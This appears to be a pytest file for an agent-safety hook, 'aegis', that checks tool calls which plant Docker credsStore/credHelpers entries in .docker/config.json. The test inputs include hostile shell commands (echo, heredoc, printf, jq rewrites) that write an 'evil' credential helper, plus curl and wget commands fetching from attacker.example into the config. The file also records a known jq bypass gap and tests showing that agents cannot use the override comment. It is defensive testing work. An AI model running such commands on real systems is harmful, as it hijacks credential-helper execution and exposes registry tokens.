"""Docker credential-helper exec-hijack protection guard — blocks Docker CLI's
own ``credsStore``/``credHelpers`` keys in ``~/.docker/config.json`` (or a
staged copy of it).

Either key names an arbitrary EXTERNAL COMMAND (``docker-credential-<value>``,
resolved on ``$PATH``) that Docker execs on every future registry auth
(``login``/``pull``/``push``/``build``) through that scope — not once, but
unattended, on someone else's future invocation, handed a live registry
credential (frequently a cloud registry's own IAM-backed token) every single
time it runs. Same "write now, auto-exec later" shape
``rule_cloud_cred_exec_protect`` already covers for AWS's ``credential_
process``/a Kubernetes kubeconfig's ``exec:`` block, one registry ecosystem
over.

Default mode is ``ask`` (not ``deny``) — both keys are routine, sanctioned
infrastructure (Docker Desktop's own helper, ``docker-credential-ecr-login``,
``pass``-backed helpers). A dedicated ``mode: deny`` policy tests the
stricter posture explicitly.

IMPORTANT, same nuance ``test_cloud_cred_exec_protect.py`` documents for
``~/.aws/*``/``~/.kube/config``: the ORDINARY absolute/home-relative form of
``~/.docker/config.json`` is ALREADY denied, non-escapably, by
``rule_containment``'s broader ``CRED_RE`` match (which already lists
``.docker/config.json`` explicitly) for native Edit/Write/Read/shell calls —
that rule runs earlier in ``BUILTIN_RULES`` and ``evaluate()`` is
first-deny-wins, so those specific cases are asserted against containment
below (a STRONGER outcome, not a gap) rather than against this guard. This
guard's own, genuinely NEW coverage is exercised via: (1) a bare relative path
with no leading separator (``CRED_RE`` requires a ``/``/``\\`` immediately
before the dot; this guard's own pattern accepts start-of-string too); (2)
content staged in a differently-named file before being moved into place; and
(3) an MCP-tool write to the ordinary absolute path — ``rule_containment``'s
``CRED_RE`` check structurally does not run for ``ActionClass.MCP`` at all,
so this is the one guard standing between an MCP-tool write and a planted
credential-helper hijack.
"""
import time

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()                                              # default mode: ask
DENY = Policy(docker_cred_helper={"mode": "deny"})             # stricter, hard-block posture

RULE = "docker-cred-helper-protect"


def _edit(path, tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _write(path, content=None):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args=args)


def _edit_content(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                       args={"file_path": path, "new_string": new_string})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp_write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                       action=ActionClass.MCP, args={"path": path, "content": content})


def _mcp_edit_edits(path, new_text):
    """The reference MCP filesystem server's real `edit_file` shape:
    {path, edits: [{oldText, newText}]} — no top-level content/new_string key."""
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__edit_file",
                       action=ActionClass.MCP,
                       args={"path": path, "edits": [{"oldText": "x", "newText": new_text}]})


def _gated(d) -> bool:
    return d.action != Action.ALLOW


# ---- ordinary absolute/home-relative path: already denied by containment ------

def test_docker_config_already_denied_by_containment():
    d = evaluate(_edit_content(
        "~/.docker/config.json", '{"credsStore": "evil"}'), EMPTY)
    assert d.blocked and d.rule == "containment-credentials"


def test_docker_config_echo_append_already_denied_by_containment():
    d = evaluate(_shell(
        'echo \'{"credHelpers":{"docker.io":"evil"}}\' > ~/.docker/config.json'), EMPTY)
    assert d.blocked and d.rule == "containment-credentials"


def test_docker_config_read_already_denied_by_containment():
    read_ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Read",
                          args={"file_path": "~/.docker/config.json"})
    assert evaluate(read_ev, EMPTY).blocked


# ---- this guard's own, non-redundant coverage ----------------------------------

def test_relative_no_separator_credsstore_gated():
    """The one case containment's CRED_RE misses: a relative path with no
    leading `/`/`\\`/`~` at all."""
    d = evaluate(_edit_content(".docker/config.json", '{"credsStore": "evil"}'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_relative_no_separator_credhelpers_gated():
    d = evaluate(_write(".docker/config.json",
                         content='{"auths": {}, "credHelpers": {"docker.io": "evil"}}'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_bare_new_string_line_gated_when_path_confirmed():
    """An Edit's `new_string` is typically just the couple of lines being
    inserted into an already-existing config — the surrounding braces are
    `old_string` context that never appears in `new_string`. Path
    confirmation alone is enough for the weak, bare-key check."""
    d = evaluate(_edit_content(".docker/config.json", '"credsStore": "evil"'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_credshelper_any_value_gated():
    """No safe/dangerous split by value — every credsStore/credHelpers value
    names a program Docker will exec and hand a live registry credential to."""
    d = evaluate(_edit_content(".docker/config.json",
                                '{"credsStore": "totally-legit-sounding-name"}'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_staged_elsewhere_gated():
    """Content staged in a differently-named file (no `.docker` path segment
    at all) before being moved into place — the strong, path-independent
    real-assignment check catches this without needing path confirmation."""
    d = evaluate(_write("staging/docker-bootstrap.json",
                         content='{"credHelpers": {"registry.evil.io": "evil"}}'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_staged_elsewhere_credsstore_gated():
    d = evaluate(_write("staging/docker-bootstrap.json",
                         content='{"credsStore": "evil"}'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_mcp_write_to_ordinary_path_gated():
    """`rule_containment`'s CRED_RE check does not run for `ActionClass.MCP`
    at all (only shell/Edit/Write/Read) — an MCP-tool write to the ordinary
    `~/.docker/config.json` path is caught only by this guard."""
    d = evaluate(_mcp_write("/home/user/.docker/config.json",
                             '{"credHelpers": {"docker.io": "evil"}}'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_mcp_nested_edits_gated():
    d = evaluate(_mcp_edit_edits(".docker/config.json", '"credsStore": "evil"'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_multiedit_relative_path_gated():
    """QA finding (bypass-hunting round): `MultiEdit` is `ActionClass.EDIT`
    (see events.py's `_TOOL_CLASS`), not MCP, and puts its text under
    `edits: [{new_string}]` -- no top-level `content`/`new_string` key. A
    first version's MCP-only `_flatten_strings` fallback left `content`
    empty here, silently ALLOWing exactly this guard's own headline
    scenario (a relative path, no leading separator)."""
    d = evaluate(Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
        args={"file_path": ".docker/config.json",
              "edits": [{"old_string": "{}", "new_string": '{"credsStore": "evil"}'}]}),
        EMPTY)
    assert _gated(d) and d.rule == RULE


def test_notebookedit_new_source_gated():
    d = evaluate(Event.make(HookEvent.PRE_TOOL_USE, tool="NotebookEdit",
        args={"notebook_path": ".docker/config.json",
              "new_source": '{"credHelpers": {"docker.io": "evil"}}'}), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_mcp_unlisted_path_key_name_gated():
    """Same MCP path-key widening `rule_cloud_cred_exec_protect` applies:
    `_path()` only recognizes a fixed key-name allowlist — an MCP tool
    naming its path argument something else entirely (`location`, `dest`,
    ...) must not leave path confirmation unreachable when the flattened-
    string sweep already sees that same path value on the content side."""
    d = evaluate(Event.make(
        HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file", action=ActionClass.MCP,
        args={"location": ".docker/config.json", "content": '"credsStore": "evil"'}), EMPTY)
    assert _gated(d) and d.rule == RULE
    d2 = evaluate(Event.make(
        HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file", action=ActionClass.MCP,
        args={"dest": "/home/user/.docker/config.json",
              "content": '{"credHelpers": {"docker.io": "evil"}}'}), EMPTY)
    assert _gated(d2) and d2.rule == RULE


# ---- shell forms ----------------------------------------------------------------

def test_heredoc_write_relative_gated():
    d = evaluate(_shell(
        "cat > .docker/config.json <<'EOF'\n{\"credsStore\": \"evil\"}\nEOF"), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_printf_redirect_relative_gated():
    d = evaluate(_shell(
        'printf \'{"credHelpers": {"docker.io": "evil"}}\' > .docker/config.json'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_jq_dot_notation_not_gated_disclosed_gap():
    """Known, disclosed scope limit (same class every sibling guard's own
    docstring accepts for a value 'assembled indirectly'): unlike
    `rule_vscode_tasks_protect`'s own dedicated jq-assignment regex, this
    guard has no jq dot-notation/`|=`/bracket-form regex of its own — a real
    JSON literal (the dominant, realistic way this file is planted, per this
    guard's own docstring) is covered; a jq REWRITE of an existing file via
    dot-path assignment is not."""
    d = evaluate(_shell(
        "jq '.credHelpers[\"docker.io\"] = \"evil\"' .docker/config.json | sponge "
        ".docker/config.json"), EMPTY)
    assert not _gated(d)


def test_docker_config_view_not_gated():
    """A read-only, unrelated docker command must not false-positive."""
    assert not _gated(evaluate(_shell("docker login registry.example.com"), EMPTY))
    assert not _gated(evaluate(_shell("docker ps -a"), EMPTY))


# ---- escape hatches: human-only --------------------------------------------------

def test_human_can_override_shell_with_comment():
    assert not _gated(evaluate(
        _shell("cat > .docker/config.json <<'EOF'\n{\"credsStore\": \"evil\"}\nEOF"
               "  # aegis-allow"),
        EMPTY))


def test_agent_cannot_override_shell_with_comment(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "builder")
    assert _gated(evaluate(
        _shell('echo \'{"credsStore": "evil"}\' > .docker/config.json  # aegis-allow'),
        EMPTY))


def test_env_toggle_allows_edit_write_shell_and_mcp(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_DOCKER_CRED_HELPER", "1")
    assert not _gated(evaluate(
        _shell('echo \'{"credsStore": "evil"}\' > .docker/config.json'), EMPTY))
    assert not _gated(evaluate(
        _edit_content(".docker/config.json", '{"credsStore": "evil"}'), EMPTY))
    assert not _gated(evaluate(
        _write("staging/docker-bootstrap.json",
               content='{"credHelpers": {"docker.io": "evil"}}'), EMPTY))
    assert not _gated(evaluate(
        _mcp_write("/home/user/.docker/config.json", '{"credsStore": "evil"}'), EMPTY))


# ---- false-positive guards --------------------------------------------------------

def test_unrelated_edit_allowed():
    assert not _gated(evaluate(_edit("src/app.py"), EMPTY))
    assert not _gated(evaluate(_write("README.md"), EMPTY))


def test_unrelated_shell_command_allowed():
    assert not _gated(evaluate(_shell("docker build -t myimage ."), EMPTY))
    assert not _gated(evaluate(_shell("docker push myimage:latest"), EMPTY))


def test_ordinary_auths_only_config_not_gated():
    """A completely ordinary docker config with only login `auths` entries
    (no credsStore/credHelpers at all) must not false-positive."""
    d = evaluate(_write(
        "staging/docker-bootstrap.json",
        content='{"auths": {"registry.example.com": {"auth": "dXNlcjpwYXNz"}}}'), EMPTY)
    assert not _gated(d)


def test_commit_message_mention_not_gated():
    assert not _gated(evaluate(
        _shell('git commit -m "document credsStore setup for CI"'), EMPTY))


def test_shell_comment_only_mention_not_gated():
    """QA finding (design/consistency round): the shell branch never
    stripped `#`-prefixed comments, unlike its sibling
    `rule_cloud_cred_exec_protect` — a documentation/TODO comment merely
    MENTIONING credsStore false-positived identically to a real write."""
    d = evaluate(_shell(
        '# TODO: consider setting "credsStore": "ecr-login" for CI later'), EMPTY)
    assert not _gated(d)


def test_prose_doc_mention_without_braces_not_gated():
    """QA finding (bypass-hunting round): a doc/postmortem line quoting the
    dangerous shape as an EXAMPLE (no surrounding `{...}` object, and no
    confirmed docker-config path) must not false-positive — the strong,
    path-independent check requires a real JSON object literal, the same
    "not just a copy-pasted line" bar `AWS_CRED_PROCESS_INI_RE`'s own
    `[section]`-header requirement holds itself to."""
    d = evaluate(_write(
        "docs/incident-postmortem.md",
        content='Example of the malicious payload we blocked:\n'
                '"credsStore": "evil"\n'), EMPTY)
    assert not _gated(d)


def test_commented_json_example_with_braces_not_gated():
    """Exercises comment-stripping actually engaging (not just the brace
    requirement alone): a full-line `#` comment quoting REAL braced JSON
    must still be stripped before the strong check runs."""
    d = evaluate(_write(
        "staging/notes.json",
        content='# example only, not a real config: {"credsStore": "evil"}\n'), EMPTY)
    assert not _gated(d)


def test_docker_compose_exec_key_not_confused():
    """Docker Compose's own unrelated `exec`/`credential_spec` vocabulary
    must not false-positive against credsStore/credHelpers checks."""
    d = evaluate(_write("docker-compose.yml", content="services:\n  app:\n    image: x\n"),
                 EMPTY)
    assert not _gated(d)


def test_credshelper_word_alone_not_gated_without_path_or_value():
    """A bare mention of the word without a real JSON-key-with-value shape
    and no confirmed docker config path must not false-positive (e.g. a doc
    line copy-pasted into an unrelated file)."""
    d = evaluate(_write("NOTES.md",
                         content="Remember to configure credsStore for CI later.\n"), EMPTY)
    assert not _gated(d)


def test_real_assignment_shape_gates_even_without_confirmed_path():
    """A REAL `key: "value"` assignment shape is treated as strong and
    path-independent (mirrors `AWS_CRED_PROCESS_INI_RE`'s own reasoning) --
    an unconfirmed/generic path does not save it, unlike the weak,
    key-alone check below."""
    d = evaluate(_write("random.json", content='{"credsStore": "x"}'), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_bare_key_no_value_not_gated_without_path():
    """The key mentioned with no colon/value at all (not a real assignment)
    is neither the weak nor the strong shape, so it must not gate on its
    own."""
    d = evaluate(_write("random.json", content='"credsStore"'), EMPTY)
    assert not _gated(d)


# ---- modes: ask (default) / deny / monitor / off ---------------------------------

def test_default_mode_is_ask():
    d = evaluate(_edit_content(".docker/config.json", '{"credsStore": "evil"}'), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE


def test_deny_mode_hard_blocks():
    d = evaluate(_edit_content(".docker/config.json", '{"credsStore": "evil"}'), DENY)
    assert d.blocked and d.action == Action.DENY and d.rule == RULE


def test_monitor_mode_logs_and_allows():
    pol = Policy(docker_cred_helper={"mode": "monitor"})
    assert not _gated(evaluate(
        _edit_content(".docker/config.json", '{"credsStore": "evil"}'), pol))


def test_off_mode_disables_guard():
    pol = Policy(docker_cred_helper={"mode": "off"})
    assert not _gated(evaluate(
        _edit_content(".docker/config.json", '{"credsStore": "evil"}'), pol))


def test_mode_off_unquoted_yaml_boolean_disables_guard():
    """YAML 1.1 parses an unquoted `off` as boolean False — the guard must
    still recognize it as 'disabled', the same config-hygiene convention
    every sibling `*_protect` guard's own `mode` knob already applies."""
    pol = Policy(docker_cred_helper={"mode": False})
    assert not _gated(evaluate(
        _edit_content(".docker/config.json", '{"credsStore": "evil"}'), pol))


def test_policy_allow_regex_exempts_trusted_command():
    pol = Policy(docker_cred_helper={"allow": [r"trusted-bootstrap\.sh"]})
    assert not _gated(evaluate(
        _shell('bash trusted-bootstrap.sh && '
               'echo \'{"credsStore": "evil"}\' > .docker/config.json'), pol))
    assert _gated(evaluate(
        _shell('echo \'{"credsStore": "evil"}\' > .docker/config.json'), pol))


def test_policy_allow_regex_exempts_trusted_path():
    """MCP write (not native Edit/Write), so this exercises this guard's own
    `allow` exemption rather than being pre-empted by containment, which
    has no `allow` knob and no MCP-action check at all."""
    pol = Policy(docker_cred_helper={"allow": [r"trusted-repo/\.docker/config\.json"]})
    assert not _gated(evaluate(
        _mcp_write("trusted-repo/.docker/config.json", '{"credsStore": "evil"}'), pol))
    assert _gated(evaluate(
        _mcp_write("other-repo/.docker/config.json", '{"credsStore": "evil"}'), pol))


# ---- fetch-to-file backstop delegation --------------------------------------------

def test_curl_o_to_ordinary_docker_config_gated_by_containment():
    """Non-escapable containment (CRED_RE) already gates this specific
    absolute path first-deny-wins, ahead of both this guard and
    fetch-to-file-protect in BUILTIN_RULES — a stronger outcome, not a gap."""
    d = evaluate(_shell("curl -o ~/.docker/config.json https://attacker.example/payload"),
                 EMPTY)
    assert _gated(d)


def test_curl_o_to_relative_docker_config_delegates_to_fetch_to_file_backstop():
    """A direct `curl -o .docker/config.json <url>` (relative, no leading
    separator — outside containment's CRED_RE reach, and this guard's own
    shell checks require an actual credsStore/credHelpers key that a bare
    fetch never has) is closed instead by `rule_fetch_to_file_protect`'s
    backstop, which reuses `DOCKER_CONFIG_PATH_RE` directly, the same way it
    backstops every sibling guard."""
    d = evaluate(_shell("curl -o .docker/config.json https://attacker.example/payload"), EMPTY)
    assert _gated(d) and d.rule == "fetch-to-file-protect"


def test_wget_o_to_relative_docker_config_delegates_to_fetch_to_file_backstop():
    d = evaluate(_shell("wget -O .docker/config.json https://attacker.example/payload"), EMPTY)
    assert _gated(d) and d.rule == "fetch-to-file-protect"


# ---- performance / ReDoS ----------------------------------------------------------

def test_docker_cred_helper_content_re_no_quadratic_blowup():
    from aegis import patterns
    adv = '"credHelpers"' + "x" * 500000
    start = time.time()
    patterns.DOCKER_CRED_HELPER_CONTENT_RE.search(adv)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"took {elapsed:.2f}s"


def test_docker_cred_helper_strong_re_no_quadratic_blowup():
    from aegis import patterns
    checks = [
        '"credsStore":' + "x" * 500000,
        '"credHelpers":{' + ("a" * 400 + " ") * 2000,
    ]
    for adv in checks:
        start = time.time()
        patterns.DOCKER_CRED_HELPER_STRONG_RE.search(adv)
        elapsed = time.time() - start
        assert elapsed < 1.0, f"took {elapsed:.2f}s on {adv[:30]!r}..."


def test_docker_config_path_re_no_quadratic_blowup():
    from aegis import patterns
    adv = ".docker" + "/" * 100000 + "config.json"
    start = time.time()
    patterns.DOCKER_CONFIG_PATH_RE.search(adv)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"took {elapsed:.2f}s"


def test_engine_no_quadratic_blowup():
    tail = " ".join(["word"] * 20000)
    cmd = 'echo \'{"credsStore": "evil"}\' > .docker/config.json ' + tail
    start = time.time()
    evaluate(_shell(cmd), EMPTY)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"rule_docker_cred_helper_protect took {elapsed:.2f}s on adversarial input"
